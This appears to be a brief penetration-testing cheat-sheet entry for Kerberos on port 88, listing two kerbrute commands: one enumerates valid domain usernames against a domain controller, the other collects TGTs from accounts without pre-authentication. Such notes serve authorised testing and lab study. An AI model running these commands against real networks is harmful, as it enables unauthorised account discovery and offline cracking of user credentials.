# 88 - Kerberos

```
# validate users
kerbrute userenum -d domain.local userlist.txt --dc 192.168.177.175

# validate users and grabbing TGTs if NO PREAUTH is present
kerbrute -domain DOMAIN.LOCAL -users users.txt -dc-ip 10.10.10.175
```
